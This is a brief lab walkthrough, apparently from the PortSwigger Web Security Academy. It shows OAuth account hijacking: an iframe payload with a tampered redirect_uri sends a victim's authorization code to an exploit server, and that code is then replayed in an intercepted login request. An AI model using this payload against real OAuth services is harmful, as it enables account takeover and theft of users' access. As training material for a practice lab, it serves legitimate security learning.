1) perform the login with wiener:peter and notice https://oauth-0a3400d70333582686f03dc3020e0042.oauth-server.net/auth?client_id=k1cvqk8g6xx4n4nadfz7r&redirect_uri=https://0a9500fe0350585886893f4d00be00f8.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email

        there is no state field (no CSRF protection)

2) create an exploit :

<iframe src="https://oauth-0a3400d70333582686f03dc3020e0042.oauth-server.net/auth?client_id=k1cvqk8g6xx4n4nadfz7r&redirect_uri=https://exploit-0aa100b203d958d8863a3ef201c700ad.exploit-server.net/exploited_values&response_type=code&scope=openid%20profile%20email"> </iframe>

So when the victim sends this request to the OAuth server, the server will send to our malicious website the authentication code


3) get the code from the exploit server logs

4) use intercept on Burp and perform the login, in the request GET /oauth-callback?code=3T2kAgN9aVUUDAWPPn0aeE96_XRGbf_svXX6qMN7eDl
        change the current code with the one stolen


DONE!!!
